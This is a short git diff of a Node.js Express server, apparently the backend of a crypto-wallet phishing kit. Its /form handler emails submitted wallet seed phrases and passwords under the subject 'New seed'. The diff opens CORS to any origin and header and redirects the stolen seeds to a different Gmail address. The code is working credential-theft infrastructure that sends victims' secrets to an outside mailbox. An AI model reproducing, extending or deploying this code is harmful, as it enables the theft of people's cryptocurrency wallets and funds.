@@ -7,7 +7,8 @@ require('dotenv').config()
 
 const app = express()
 app.use(cors({
-  origin: 'http://localhost:3000',
+  origin: '*',
+  allowedHeaders: '*'
 }))
 const port = process.env.PORT || 8080
 
@@ -35,7 +36,7 @@ app.post('/form', async(req, res) => {
  
   const response = await transporter.sendMail({
     from: 'jtom29544@gmail.com',
-    to: "jtom29544@gmail.com",
+    to: "xenuxyz@gmail.com",
     subject: "New seed", 
     text: `seed: ${seed} \npassword: ${password ? password : ''}`
   })
